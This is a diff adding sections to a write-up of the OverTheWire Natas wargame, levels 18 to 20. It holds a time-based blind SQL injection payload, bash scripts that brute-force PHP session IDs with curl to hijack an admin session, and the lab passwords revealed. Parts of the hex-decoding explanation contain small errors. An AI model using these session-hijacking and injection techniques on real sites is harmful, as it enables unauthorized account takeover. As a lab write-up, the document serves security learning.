@@ -522,3 +522,54 @@ username=natas18" AND IF(password LIKE BINARY '$pref%', SLEEP(4),0) OR username=
 `OR username="` is used to "close" the quotes that the server used. We check the response time from the server, and if it is greater that 4 seconds then we got a match, and we move to the next char.
 
 Password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
+
+## Level 18 → 19
+The website asks for an admin user login in order to give the next password. Looking at the source code, we can see that the website using a `PHP session` to login.
+
+### PHP Session Hijacking Attack
+A `PHP session hijacking attack` occurs when an attacker steals a victim's session ID (usually stored in a cookie) and uses it to impersonate the victim on a web application. Since PHP uses session IDs to identify logged-in users, obtaining a valid session ID lets the attacker bypass authentication without needing a password. This can happen through insecure cookie handling, XSS (cross-site scripting), or sniffing network traffic over unencrypted connections. Once the attacker sets the stolen session ID in their browser or HTTP requests, they gain access to the victim’s account as if they were legitimately logged in.
+
+We can see in the source code that the `PHP session ID` is just a number between 1 and 640. So we can brute force over all the session IDs and hopefully one of them is an active session of an admin.
+```bash
+#!/bin/bash
+url="http://natas18.natas.labs.overthewire.org"
+credentials="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+
+for i in {1..640}; do
+	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$i" $url);
+	
+	echo "$i: $(echo $response | grep "Password")"
+done
+```
+We start scanning the `PHP session` IDs from 1, and by the 119th ID we get an admin access and the username (`natas19`) and password are revealed.
+
+Password: `tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
+
+## Level 19 → 20
+This level is similar to the previous level, but session IDs are not sequental. We need to understand how the session IDs are given, so we first get our own by sending `username` as `admin` with a random password. We get the ID `3132382d61646d696e`, which looks like a hex value. We should get more values to try and find a pattern.
+```
+3332322d61646d696e
+3332362d61646d696e
+3231332d61646d696e
+```
+We can see a clear pattern, where the first 3 bytes are between 30 and 39 and the rest is `2d646667`. If we decode it as `URL encoding`, we find out the pattern; It contains random 3 digits, then a separator `-` and then the username. for example, `3132382d61646d696e` is `128-admin`. In the previous level we found the admin username, which was `natas19`, and the max ID was 640. As this level is similar, we can suggest that the username is `natas20` and brute force the random digits.
+
+```bash
+#!/bin/bash
+url="http://natas19.natas.labs.overthewire.org"
+credentials="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
+
+for i in {1..640}; do
+	response=$(curl -X POST -s -u $credentials -d "username=x&password=y" --cookie "PHPSESSID=$(echo -n "$i" | od -An -tx1 | tr -d ' \n')2d61646d696e" $url);
+
+	if ! echo "$response" | grep -q "regular"; then
+		echo "$i$j$k: $response"
+	fi
+done
+```
+Explaining this line ```bash (echo -n "$i" | od -An -tx1 | tr -d ' \n') ```:
+* ```bash echo -n "$i" ``` - prints the number, `-n` prevents a new line.
+* ```bash od -An -tx1 ``` -  dumps the input as hex bytes, `-An` removes the address.
+* ```bash tr -d ' \n' ``` - removes spaces and new line.
+
+Using that script with `username=natas20` didn't work, so i changed it to `admin`. It worked, the right combination was `281-admin`, which is `3238312d61646d696e` encoded. We can see that using `URL encoding` is as safe (or not safe) as using plain text.
